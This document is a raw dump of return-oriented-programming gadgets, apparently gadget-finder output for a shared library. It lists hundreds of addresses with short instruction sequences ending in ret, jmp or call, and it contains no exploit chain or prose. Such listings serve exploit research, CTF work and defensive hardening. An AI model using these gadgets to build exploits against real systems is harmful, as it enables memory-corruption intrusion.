0x00002aaaaabe3011 : mov dh, 0xc0 ; neg eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab4034d : mov dh, 0xc0 ; neg eax ; pop rbx ; ret
0x00002aaaaab4031a : mov dh, 0xc0 ; neg eax ; ret
0x00002aaaaac07dd6 : mov dh, 0xc0 ; pop rbp ; pop r12 ; ret
0x00002aaaaac039fb : mov dh, 0xc0 ; pop rbx ; pop rbp ; ret
0x00002aaaaab9ba0c : mov dh, 0xc0 ; pop rbx ; ret
0x00002aaaaab0af2a : mov dh, 0xc0 ; ret
0x00002aaaaab63134 : mov dh, 0xc0 ; sar rdx, cl ; movzx edx, dl ; sub eax, edx ; ret
0x00002aaaaab7f038 : mov dh, 0xc1 ; pop rbx ; ret
0x00002aaaaab7f060 : mov dh, 0xc2 ; pop rbx ; ret
0x00002aaaaab4f78e : mov dh, 0xc5 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabed80e : mov dh, 0xc6 ; or eax, edi ; bswap eax ; ret
0x00002aaaaab4cf33 : mov dh, 0xc7 ; mov qword ptr [rsi + 0x28], rcx ; mov byte ptr [rdx], dil ; ret
0x00002aaaaab976a6 : mov dh, 0xc7 ; movsxd r8, dword ptr [rdx + r8*4] ; add rdx, r8 ; jmp rdx
0x00002aaaaab463fe : mov dh, 0xc7 ; ret
0x00002aaaaac59704 : mov dh, 0xc7 ; ret 0xe71f
0x00002aaaaab9762b : mov dh, 0xd1 ; movsxd rdx, dword ptr [rax + rdx*4] ; add rax, rdx ; jmp rax
0x00002aaaaab6313a : mov dh, 0xd2 ; sub eax, edx ; ret
0x00002aaaaabb56b0 : mov dh, 0xd6 ; movsxd rdx, dword ptr [rcx + rdx*4] ; add rdx, rcx ; jmp rdx
0x00002aaaaac5a237 : mov dh, 0xdd ; in eax, -0x1e ; add ch, byte ptr [ebp + ebp*2 + 0x5b] ; ret 0x6f9
0x00002aaaaab5f591 : mov dh, 0xe ; movzx eax, byte ptr [rdi] ; sub eax, ecx ; ret
0x00002aaaaac42874 : mov dh, 0xe ; sub eax, ecx ; ret
0x00002aaaaab311eb : mov dh, 0xe4 ; movsxd rcx, dword ptr [rax + r12*4] ; add rax, rcx ; jmp rax
0x00002aaaaab31418 : mov dh, 0xe4 ; movsxd rdx, dword ptr [rax + r12*4] ; add rax, rdx ; jmp rax
0x00002aaaaac74f99 : mov dh, 0xeb ; jmp qword ptr [rax]
0x00002aaaaabadf63 : mov dh, 0xed ; movsxd rdx, dword ptr [rax + rbp*4] ; add rax, rdx ; jmp rax
0x00002aaaaabfaa99 : mov dh, 0xf ; test cl, cl ; jne 0x1259ee ; ret
0x00002aaaaab80f52 : mov dh, 0xf3 ; mov rdi, qword ptr [rbp] ; call r12
0x00002aaaaab0840c : mov dh, 0xf6 ; movsxd rsi, dword ptr [rdi + rsi*4] ; add rsi, rdi ; jmp rsi
0x00002aaaaac69531 : mov dh, 0xfd ; call rcx
0x00002aaaaabdb975 : mov dh, 0xff ; shr rax, 0xc ; xor al, al ; or eax, edi ; ret
0x00002aaaaab4f621 : mov dh, 2 ; ret
0x00002aaaaabb9b52 : mov dh, 4 ; adc byte ptr [rax - 0x77], cl ; ret 0xc148
0x00002aaaaabab62c : mov dh, 4 ; xor byte ptr [rax - 0x77], cl ; ret 0xc148
0x00002aaaaac42871 : mov dh, 7 ; movzx ecx, byte ptr [rsi] ; sub eax, ecx ; ret
0x00002aaaaab63111 : mov dh, 7 ; movzx edx, byte ptr [rsi] ; sub eax, edx ; ret
0x00002aaaaab5f594 : mov dh, 7 ; sub eax, ecx ; ret
0x00002aaaaac5cb81 : mov dh, bl ; jmp rdx
0x00002aaaaab42cb8 : mov dh, byte ptr [rax] ; add dword ptr [rax], eax ; add bl, dh ; ret
0x00002aaaaab61da5 : mov dh, byte ptr [rbx] ; add al, ch ; ret
0x00002aaaaab7f1cc : mov dh, byte ptr [rcx - 0xd] ; ret
0x00002aaaaac7ad81 : mov dh, ch ; call qword ptr [rsi]
0x00002aaaaac7adb1 : mov dh, ch ; jmp rbx
0x00002aaaaac6f1d8 : mov dil, 0xf9 ; call rsp
0x00002aaaaaad8aa4 : mov dl, 0x1e ; ret
0x00002aaaaabfcb84 : mov dl, 0x29 ; add byte ptr [rbx - 0x3f7ae7c0], cl ; jne 0x127b9a ; ret
0x00002aaaaab80cca : mov dl, 0x31 ; or al, 0 ; ret
0x00002aaaaab996b3 : mov dl, 0x48 ; add edx, esi ; jmp rdx
0x00002aaaaac69c20 : mov dl, 0x60 ; cld ; inc dword ptr [rdx + 0x60] ; cld ; call rdx
0x00002aaaaac48bfd : mov dl, 0x66 ; nop ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac6a314 : mov dl, 0x7e ; cld ; push qword ptr [rdx] ; jle 0x195322 ; jmp qword ptr [rdx + 0x22fffc7d]
0x00002aaaaac6a844 : mov dl, 0x9e ; cld ; jmp qword ptr [rdx]
0x00002aaaaac6a644 : mov dl, 0xa8 ; cld ; inc dword ptr [rdx - 0x58] ; cld ; call rdx
0x00002aaaaab3ad59 : mov dl, 0xeb ; xchg eax, ecx ; mov rdi, r15 ; call 0x71fd8
0x00002aaaaac5ced1 : mov dl, 0xf3 ; jmp rsp
0x00002aaaaabdef95 : mov dl, 3 ; add al, 0xa ; ret
0x00002aaaaac412ca : mov dl, 3 ; add byte ptr [rax], al ; cmp byte ptr [rax], 1 ; sbb rax, -1 ; ret
0x00002aaaaac2e857 : mov dl, 3 ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaab7ae73 : mov dl, byte ptr [rsi + 2] ; mov word ptr [rdi], cx ; mov byte ptr [rdi + 2], dl ; ret
0x00002aaaaab7ae92 : mov dl, byte ptr [rsi + 4] ; mov dword ptr [rdi], ecx ; mov byte ptr [rdi + 4], dl ; ret
0x00002aaaaab7aed3 : mov dl, byte ptr [rsi + 8] ; mov qword ptr [rdi], rcx ; mov byte ptr [rdi + 8], dl ; ret
0x00002aaaaac27000 : mov dl, byte ptr [rsi - 1] ; mov byte ptr [rdi - 1], dl ; ret
0x00002aaaaab7c5a0 : mov dl, byte ptr [rsi] ; mov byte ptr [rdi], dl ; lea rax, qword ptr [rdi + 1] ; ret
0x00002aaaaab7ae50 : mov dl, byte ptr [rsi] ; mov byte ptr [rdi], dl ; ret
0x00002aaaaab7e010 : mov dl, byte ptr [rsi] ; mov byte ptr [rdi], dl ; xor ch, ch ; mov byte ptr [rdi + 1], ch ; ret
0x00002aaaaabcbfd0 : mov dl, dh ; dec dword ptr [rax - 0x77] ; ret
0x00002aaaaac5e401 : mov dr0, ebp ; call rsi
0x00002aaaaac5cbb5 : mov dr0, ebx ; jmp rdx
0x00002aaaaab91ba6 : mov dr0, word ptr [rax] ; add byte ptr [rcx + 0x308f090d], cl ; add byte ptr [rcx + 1], cl ; ret
0x00002aaaaac6a9f9 : mov dr1, esp ; call rax
0x00002aaaaabddb26 : mov ds, eax ; sub eax, dword ptr [rax] ; add word ptr [rdx + rax*2], 1 ; ret
0x00002aaaaabdb822 : mov dword ptr [0x2d0], eax ; pop rax ; pop rdi ; call rax
0x00002aaaaaba1674 : mov dword ptr [0x2d0], eax ; ret
0x00002aaaaab8fa8f : mov dword ptr [r10 + 0xc], edi ; pop rbp ; pop r12 ; pop r14 ; ret
0x00002aaaaab53c46 : mov dword ptr [r12 + 0x14], eax ; pop r12 ; ret
0x00002aaaaabecaa7 : mov dword ptr [r12 + rax*4], 0 ; mov edx, dword ptr [rbx] ; jmp 0x117a80
0x00002aaaaab93633 : mov dword ptr [r12], 1 ; jmp 0xbe608
0x00002aaaaac01cfe : mov dword ptr [r14], 0 ; ret
0x00002aaaaab3aac7 : mov dword ptr [r14], r13d ; jmp 0x64bfa
0x00002aaaaab947db : mov dword ptr [r15], eax ; jmp 0xbf370
0x00002aaaaabf83b0 : mov dword ptr [r8], edi ; mov qword ptr [r9], rcx ; ret
0x00002aaaaab0fcb3 : mov dword ptr [r8], edx ; mov dword ptr [rsi], edx ; ret
0x00002aaaaabf8314 : mov dword ptr [r8], edx ; mov qword ptr [r9], r10 ; ret
0x00002aaaaabe9c20 : mov dword ptr [r8], edx ; xor eax, eax ; ret
0x00002aaaaab80d61 : mov dword ptr [r9 + 4], esi ; jne 0xabd76 ; mov dword ptr [r9 + 8], esi ; ret
0x00002aaaaab80d67 : mov dword ptr [r9 + 8], esi ; ret
0x00002aaaaab74006 : mov dword ptr [r9 - 2], ecx ; ret
0x00002aaaaab73ff1 : mov dword ptr [r9 - 4], ecx ; ret
0x00002aaaaab46c39 : mov dword ptr [rax + 0x10], edx ; mov qword ptr [rax + 0x40], rcx ; ret
0x00002aaaaab46c79 : mov dword ptr [rax + 0x10], esi ; mov qword ptr [rax + 0x40], rcx ; ret
0x00002aaaaab47bd9 : mov dword ptr [rax + 0x18], edx ; mov dword ptr [rbx], ecx ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab4c469 : mov dword ptr [rax + 0x20], edx ; pop rbx ; ret
0x00002aaaaab463f6 : mov dword ptr [rax + 0x28], ecx ; mov byte ptr [rdx], dil ; movzx eax, dil ; ret
0x00002aaaaaba1deb : mov dword ptr [rax + 0x2f], esp ; add byte ptr [rax - 0x39], cl ; ret 0xffff
0x00002aaaaab47ad5 : mov dword ptr [rax + 0x38], esp ; mov dword ptr [rbx + 0x74], edx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab46c3d : mov dword ptr [rax + 0x40], ecx ; ret
0x00002aaaaab47c77 : mov dword ptr [rax + 0x48], 0 ; pop rbx ; ret
0x00002aaaaaaf8acc : mov dword ptr [rax + 0x50], ecx ; mov dword ptr [rax + 0x54], edx ; ret
0x00002aaaaaaf8acf : mov dword ptr [rax + 0x54], edx ; ret
0x00002aaaaab4046b : mov dword ptr [rax + 4], 1 ; xor eax, eax ; ret
0x00002aaaaab50b1a : mov dword ptr [rax + 8], 0 ; ret
0x00002aaaaabd3631 : mov dword ptr [rax + 8], edi ; mov qword ptr [rdi], rax ; mov qword ptr [rdi + 8], rsi ; ret
0x00002aaaaab6375e : mov dword ptr [rax + rdx - 2], ecx ; ret
0x00002aaaaab30d92 : mov dword ptr [rax - 0x7d], ecx ; ret 0x8d01
0x00002aaaaac1095d : mov dword ptr [rax], 0 ; pop rbx ; ret
0x00002aaaaac170b8 : mov dword ptr [rax], 0x16 ; mov eax, 0x16 ; ret
0x00002aaaaab0a488 : mov dword ptr [rax], 0x16 ; mov eax, 0xffffffff ; ret
0x00002aaaaabcf9c8 : mov dword ptr [rax], 0x16 ; mov eax, 1 ; ret
0x00002aaaaabd1718 : mov dword ptr [rax], 0x16 ; mov eax, edi ; ret
0x00002aaaaabd69f8 : mov dword ptr [rax], 0x16 ; ret
0x00002aaaaab8fb90 : mov dword ptr [rax], 0x16 ; xor eax, eax ; ret
0x00002aaaaab09b1c : mov dword ptr [rax], 0x22 ; add rsp, 0x28 ; ret
0x00002aaaaab0a174 : mov dword ptr [rax], 0x22 ; add rsp, 8 ; ret
0x00002aaaaab0b138 : mov dword ptr [rax], 0x26 ; mov eax, 0xffffffff ; ret
0x00002aaaaab08ea0 : mov dword ptr [rax], 0x2a ; mov rax, rcx ; ret
0x00002aaaaabcb3e0 : mov dword ptr [rax], 0x5f ; mov eax, 0xffffffff ; ret
0x00002aaaaabd1278 : mov dword ptr [rax], 0xc ; mov eax, 0xffffffff ; ret
0x00002aaaaab56b3a : mov dword ptr [rax], 0xc ; mov rax, rcx ; ret
0x00002aaaaab57338 : mov dword ptr [rax], 0xc ; xor eax, eax ; ret
0x00002aaaaac7c645 : mov dword ptr [rax], 0xf0473800 ; jmp qword ptr [rdi]
0x00002aaaaabd1264 : mov dword ptr [rax], 0xffffffff ; xor eax, eax ; ret
0x00002aaaaaba1220 : mov dword ptr [rax], 2 ; mov eax, 0xffffffff ; ret
0x00002aaaaab9c528 : mov dword ptr [rax], 2 ; xor eax, eax ; ret
0x00002aaaaab48c9d : mov dword ptr [rax], 9 ; mov eax, 0xffffffff ; ret
0x00002aaaaaaf6228 : mov dword ptr [rax], 9 ; mov eax, edi ; ret
0x00002aaaaac78845 : mov dword ptr [rax], eax ; add al, bl ; jns 0x1a383e ; jmp qword ptr [rcx]
0x00002aaaaab80023 : mov dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x00002aaaaabbed64 : mov dword ptr [rax], eax ; mov eax, 0xffffffff ; ret
0x00002aaaaabaa088 : mov dword ptr [rax], ebp ; mov eax, 1 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab47165 : mov dword ptr [rax], ecx ; mov eax, dword ptr [rdx] ; pop rbx ; ret
0x00002aaaaab455ca : mov dword ptr [rax], ecx ; mov eax, dword ptr [rdx] ; ret
0x00002aaaaab34b88 : mov dword ptr [rax], edi ; jmp 0x5fb51
0x00002aaaaab37807 : mov dword ptr [rax], edi ; jmp 0x627d0
0x00002aaaaabd3611 : mov dword ptr [rax], edi ; mov eax, 0xffffffff ; ret
0x00002aaaaabf83b1 : mov dword ptr [rax], edi ; mov qword ptr [r9], rcx ; ret
0x00002aaaaab58566 : mov dword ptr [rax], edi ; ret
0x00002aaaaabdb6e3 : mov dword ptr [rax], edx ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab80da1 : mov dword ptr [rax], edx ; jne 0xabd9d ; ret
0x00002aaaaabf811a : mov dword ptr [rax], edx ; lea eax, dword ptr [r9 + r8 + 2] ; pop rbx ; ret
0x00002aaaaab0fcb4 : mov dword ptr [rax], edx ; mov dword ptr [rsi], edx ; ret
0x00002aaaaabbedba : mov dword ptr [rax], edx ; mov eax, 0xffffffff ; ret
0x00002aaaaac02cc3 : mov dword ptr [rax], edx ; mov eax, 1 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab470a5 : mov dword ptr [rax], edx ; mov eax, dword ptr [rsi] ; pop rbx ; ret
0x00002aaaaabf8315 : mov dword ptr [rax], edx ; mov qword ptr [r9], r10 ; ret
0x00002aaaaab46c36 : mov dword ptr [rax], edx ; mov qword ptr [rax + 0x10], rdx ; mov qword ptr [rax + 0x40], rcx ; ret
0x00002aaaaab46c76 : mov dword ptr [rax], edx ; mov qword ptr [rax + 0x10], rsi ; mov qword ptr [rax + 0x40], rcx ; ret
0x00002aaaaab029d3 : mov dword ptr [rax], edx ; ret
0x00002aaaaabd123c : mov dword ptr [rax], edx ; xor eax, eax ; cmp rdi, rdx ; ja 0xfc27a ; ret
0x00002aaaaab47ef1 : mov dword ptr [rax], edx ; xor eax, eax ; ret
0x00002aaaaabbed63 : mov dword ptr [rax], r8d ; mov eax, 0xffffffff ; ret
0x00002aaaaab4bba1 : mov dword ptr [rbp + 0x30], edx ; mov qword ptr [rbx + 0x18], rdx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabca071 : mov dword ptr [rbp + 4], edx ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab518fe : mov dword ptr [rbp + 8], eax ; add rsp, 8 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00002aaaaab518cd : mov dword ptr [rbp + 8], eax ; xor eax, eax ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab24264 : mov dword ptr [rbp + 8], edx ; jmp 0x4f246
0x00002aaaaab2de13 : mov dword ptr [rbp - 0x1070], 0 ; jmp rax
0x00002aaaaaba7534 : mov dword ptr [rbp - 0x2888], esi ; sub r10, rax ; jmp 0xd255b
0x00002aaaaab23a76 : mov dword ptr [rbp - 0x4e0], ebx ; call 0x8ad18
0x00002aaaaab2264e : mov dword ptr [rbp - 0x4e8], esi ; jmp rax
0x00002aaaaab3ef55 : mov dword ptr [rbp - 0x518], ecx ; jmp 0x661ec
0x00002aaaaaaf8656 : mov dword ptr [rbp - 0x58], edx ; call 0x1f8a5
0x00002aaaaabe8d65 : mov dword ptr [rbp - 0x70], eax ; mov eax, dword ptr [r14 + 0x18] ; mov dword ptr [rbp - 0x80], eax ; call r9
0x00002aaaaabe81dd : mov dword ptr [rbp - 0x70], eax ; mov eax, dword ptr [rbx + 0x60] ; mov dword ptr [rbp - 0x80], eax ; call rcx
0x00002aaaaabe8b13 : mov dword ptr [rbp - 0x70], edx ; mov rdx, r13 ; call rax
0x00002aaaaabe8d6c : mov dword ptr [rbp - 0x80], eax ; call r9
0x00002aaaaabe81e3 : mov dword ptr [rbp - 0x80], eax ; call rcx
0x00002aaaaabe878a : mov dword ptr [rbp - 0x80], edx ; mov rdx, r12 ; call rax
0x00002aaaaabe8c50 : mov dword ptr [rbp - 0x80], edx ; mov rdx, r13 ; call rax
0x00002aaaaabe8724 : mov dword ptr [rbp - 0x80], edx ; mov rdx, r14 ; call rax
0x00002aaaaabe82b3 : mov dword ptr [rbp - 0x80], edx ; mov rdx, rbx ; call rax
0x00002aaaaab2724f : mov dword ptr [rbp - 0xb8], ecx ; mov rdi, rbx ; call rax
0x00002aaaaab5c2c2 : mov dword ptr [rbp], eax ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab101db : mov dword ptr [rbp], eax ; xor eax, eax ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab6bd6e : mov dword ptr [rbp], ebp ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaac1638d : mov dword ptr [rbp], ebx ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaab19c91 : mov dword ptr [rbp], ebx ; add rsp, 0x28 ; pop rbx ; pop rbp ; ret
0x00002aaaaabed6c5 : mov dword ptr [rbp], ebx ; xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab0f5fa : mov dword ptr [rbp], edx ; call rax
0x00002aaaaab9d1a6 : mov dword ptr [rbp], esi ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab4f35f : mov dword ptr [rbp], esp ; mov rax, rbx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaaaf7bab : mov dword ptr [rbp], esp ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab45982 : mov dword ptr [rbp], esp ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab4f35e : mov dword ptr [rbp], r12d ; mov rax, rbx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab45981 : mov dword ptr [rbp], r12d ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaaaff6d1 : mov dword ptr [rbx + 0x10], 0 ; pop rbx ; ret
0x00002aaaaab4d457 : mov dword ptr [rbx + 0x10], eax ; mov rax, rbx ; pop rbx ; ret
0x00002aaaaab9c908 : mov dword ptr [rbx + 0x10], eax ; mov rsi, rbp ; xor edx, edx ; jmp 0xc78de
0x00002aaaaac17a06 : mov dword ptr [rbx + 0x10], eax ; pop rax ; pop rdx ; pop rbx ; ret
0x00002aaaaab4d9b9 : mov dword ptr [rbx + 0x10], eax ; xor eax, eax ; pop rbx ; ret
0x00002aaaaabe30c4 : mov dword ptr [rbx + 0x10], ebp ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab509ad : mov dword ptr [rbx + 0x18], 0 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac105d5 : mov dword ptr [rbx + 0x18], 0 ; pop rbx ; ret
0x00002aaaaac179be : mov dword ptr [rbx + 0x18], eax ; pop rax ; pop rdx ; pop rbx ; ret
0x00002aaaaabe30f4 : mov dword ptr [rbx + 0x18], ebp ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab52395 : mov dword ptr [rbx + 0x18], ebp ; nop ; mov rax, rbx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab9c38a : mov dword ptr [rbx + 0x18], edx ; add rsp, 0xd0 ; pop rbx ; ret
0x00002aaaaab4bb02 : mov dword ptr [rbx + 0x18], edx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab4bba5 : mov dword ptr [rbx + 0x18], edx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac037aa : mov dword ptr [rbx + 0x20], eax ; add rsp, 8 ; mov eax, edx ; pop rbx ; pop rbp ; ret
0x00002aaaaab501a3 : mov dword ptr [rbx + 0x20], eax ; mov dword ptr [rbx], edx ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab5da99 : mov dword ptr [rbx + 0x20], eax ; mov qword ptr [rbx + 8], rsi ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac03754 : mov dword ptr [rbx + 0x20], ecx ; add rsp, 8 ; mov eax, edx ; pop rbx ; pop rbp ; ret
0x00002aaaaab9c406 : mov dword ptr [rbx + 0x20], edx ; add rsp, 0xd0 ; pop rbx ; ret
0x00002aaaaac10629 : mov dword ptr [rbx + 0x20], esp ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabbc7db : mov dword ptr [rbx + 0x28], 0 ; pop rbx ; ret
0x00002aaaaab4c495 : mov dword ptr [rbx + 0x28], eax ; pop rbx ; ret
0x00002aaaaab5d609 : mov dword ptr [rbx + 0x30], ecx ; call rcx
0x00002aaaaab5d608 : mov dword ptr [rbx + 0x30], r9d ; call rcx
0x00002aaaaab5d602 : mov dword ptr [rbx + 0x40], eax ; mov qword ptr [rbx], rdi ; mov dword ptr [rbx + 0x30], r9d ; call rcx
0x00002aaaaab0a22f : mov dword ptr [rbx + 0x40], eax ; xor eax, eax ; pop rbx ; ret
0x00002aaaaabd0601 : mov dword ptr [rbx + 0x48], eax ; pop rbx ; ret
0x00002aaaaab5d6be : mov dword ptr [rbx + 0x48], ecx ; call rcx
0x00002aaaaab5020b : mov dword ptr [rbx + 0x50], 0 ; pop rbx ; ret
0x00002aaaaab47dba : mov dword ptr [rbx + 0x60], ebp ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab4e832 : mov dword ptr [rbx + 0x70], ebp ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab46cc4 : mov dword ptr [rbx + 0x74], eax ; add rsp, 0x20 ; pop rbx ; ret
0x00002aaaaab47ad8 : mov dword ptr [rbx + 0x74], edx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab4d327 : mov dword ptr [rbx + 0x90], eax ; pop rbx ; ret
0x00002aaaaab93bcf : mov dword ptr [rbx + 0xc], eax ; xor eax, eax ; add rsp, 0x20 ; pop rbx ; ret
0x00002aaaaabf6622 : mov dword ptr [rbx + 4], eax ; xor eax, eax ; add rsp, 0x28 ; pop rbx ; pop rbp ; ret
0x00002aaaaab4d453 : mov dword ptr [rbx + 8], eax ; mov qword ptr [rbx + 0x10], rax ; mov rax, rbx ; pop rbx ; ret
0x00002aaaaab4d9b5 : mov dword ptr [rbx + 8], eax ; mov qword ptr [rbx + 0x10], rax ; xor eax, eax ; pop rbx ; ret
0x00002aaaaaaff6e7 : mov dword ptr [rbx + 8], eax ; pop rbx ; ret
0x00002aaaaabe3094 : mov dword ptr [rbx + 8], ebp ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab5db49 : mov dword ptr [rbx + 8], ebp ; mov qword ptr [rbx], rdx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab0ae08 : mov dword ptr [rbx + 8], edx ; add rsp, 0x40 ; pop rbx ; ret
0x00002aaaaab5042a : mov dword ptr [rbx + 8], edx ; movzx eax, byte ptr [rax] ; pop rbx ; ret
0x00002aaaaab5da9d : mov dword ptr [rbx + 8], esi ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab80b26 : mov dword ptr [rbx + rcx*4], 0x75c08507 ; xor eax, eax ; ret
0x00002aaaaab8e9c4 : mov dword ptr [rbx - 0x74b7f808], 0xf70244c ; xchg eax, ebp ; ret 0x8b4c
0x00002aaaaac074ad : mov dword ptr [rbx], 0 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabd69e2 : mov dword ptr [rbx], 0 ; pop rbx ; ret
0x00002aaaaac2d1eb : mov dword ptr [rbx], 0x14634900 ; xchg eax, ebx ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaaba6621 : mov dword ptr [rbx], eax ; add byte ptr [rcx - 0x77], al ; ret
0x00002aaaaac107f3 : mov dword ptr [rbx], eax ; add rsp, 0x10 ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab5052c : mov dword ptr [rbx], eax ; add rsp, 0x20 ; pop rbx ; ret
0x00002aaaaab5be1c : mov dword ptr [rbx], eax ; je 0x86fab ; mov rsi, r14 ; call rax
0x00002aaaaac17c31 : mov dword ptr [rbx], eax ; pop rax ; pop rdx ; pop rbx ; ret
0x00002aaaaac0c67f : mov dword ptr [rbx], eax ; pop rbx ; ret
0x00002aaaaabd6982 : mov dword ptr [rbx], eax ; setne al ; movzx eax, al ; pop rbx ; ret
0x00002aaaaac0b995 : mov dword ptr [rbx], eax ; xor eax, eax ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaac0b360 : mov dword ptr [rbx], eax ; xor eax, eax ; add rsp, 0x20 ; pop rbx ; ret
0x00002aaaaac0b4e3 : mov dword ptr [rbx], eax ; xor eax, eax ; add rsp, 0x38 ; pop rbx ; pop rbp ; ret
0x00002aaaaaba06af : mov dword ptr [rbx], ebp ; add rsp, 0x18 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00002aaaaab42f3a : mov dword ptr [rbx], ebp ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac17049 : mov dword ptr [rbx], ebp ; xor eax, eax ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaab47bdc : mov dword ptr [rbx], ecx ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab5d606 : mov dword ptr [rbx], edi ; mov dword ptr [rbx + 0x30], r9d ; call rcx
0x00002aaaaab1cd7c : mov dword ptr [rbx], edx ; jg 0x47c91 ; pop rbx ; ret
0x00002aaaaab50a60 : mov dword ptr [rbx], edx ; mov eax, 1 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab5db23 : mov dword ptr [rbx], edx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab501a6 : mov dword ptr [rbx], edx ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab5d6bb : mov dword ptr [rbx], esi ; mov qword ptr [rbx + 0x48], r9 ; call rcx
0x00002aaaaab91072 : mov dword ptr [rbx], esi ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaac06724 : mov dword ptr [rcx + 0x10], edx ; mov eax, 1 ; ret
0x00002aaaaac09518 : mov dword ptr [rcx + 0x48], eax ; mov eax, 1 ; ret
0x00002aaaaac09475 : mov dword ptr [rcx + 0x54], eax ; mov eax, 1 ; ret
0x00002aaaaac09545 : mov dword ptr [rcx + 0x58], eax ; mov eax, 1 ; ret
0x00002aaaaaad544d : mov dword ptr [rcx + 0x7c05000c], eax ; adc byte ptr [rsp + rcx], bl ; ret 0x4412
0x00002aaaaaaf557d : mov dword ptr [rcx + 0x968], eax ; ret
0x00002aaaaac06820 : mov dword ptr [rcx + 0xa8], eax ; mov eax, 1 ; ret
0x00002aaaaac06705 : mov dword ptr [rcx + 0xb4], eax ; mov eax, 1 ; ret
0x00002aaaaac0684d : mov dword ptr [rcx + 0xb8], eax ; mov eax, 1 ; ret
0x00002aaaaac3d102 : mov dword ptr [rcx + 3], edx ; ret
0x00002aaaaab804a0 : mov dword ptr [rcx + 4], eax ; jne 0xab46e ; ret
0x00002aaaaac3d0f3 : mov dword ptr [rcx + 4], edx ; ret
0x00002aaaaab80d62 : mov dword ptr [rcx + 4], esi ; jne 0xabd75 ; mov dword ptr [r9 + 8], esi ; ret
0x00002aaaaab8049f : mov dword ptr [rcx + 4], r8d ; jne 0xab46f ; ret
0x00002aaaaac3d164 : mov dword ptr [rcx + 5], edx ; ret
0x00002aaaaac3d174 : mov dword ptr [rcx + 6], edx ; ret
0x00002aaaaac3d143 : mov dword ptr [rcx + 7], edx ; ret
0x00002aaaaac3d134 : mov dword ptr [rcx + 8], edx ; ret
0x00002aaaaab80d68 : mov dword ptr [rcx + 8], esi ; ret
0x00002aaaaab72d96 : mov dword ptr [rcx + rcx*4], 0x8948fc47 ; clc ; ret
0x00002aaaaab250db : mov dword ptr [rcx + rdx*8], eax ; add rsp, 8 ; mov eax, ebp ; pop rbx ; pop rbp ; ret
0x00002aaaaab1d1cb : mov dword ptr [rcx + rsi*8], eax ; xor eax, eax ; pop rbx ; ret
0x00002aaaaabdd47f : mov dword ptr [rcx - 0x7d], ecx ; ret 0x4c01
0x00002aaaaab74007 : mov dword ptr [rcx - 2], ecx ; ret
0x00002aaaaab73ff2 : mov dword ptr [rcx - 4], ecx ; ret
0x00002aaaaab73fe1 : mov dword ptr [rcx - 8], ecx ; ret
0x00002aaaaaaf9bba : mov dword ptr [rcx], 0x83480b89 ; rol byte ptr [rax + rcx*2], 0x83 ; ret
0x00002aaaaab730b2 : mov dword ptr [rcx], 0x840fbe0f ; leave ; jne 0x9e0b3 ; xor eax, eax ; ret
0x00002aaaaaba5a1c : mov dword ptr [rcx], 0xdf75d284 ; ret
0x00002aaaaac6da55 : mov dword ptr [rcx], eax ; add byte ptr [rsi + rsi*2 - 0xa], dh ; jmp rsp
0x00002aaaaabab102 : mov dword ptr [rcx], eax ; add rsp, 0x20 ; pop rbx ; ret
0x00002aaaaab3545c : mov dword ptr [rcx], eax ; jmp 0x60425
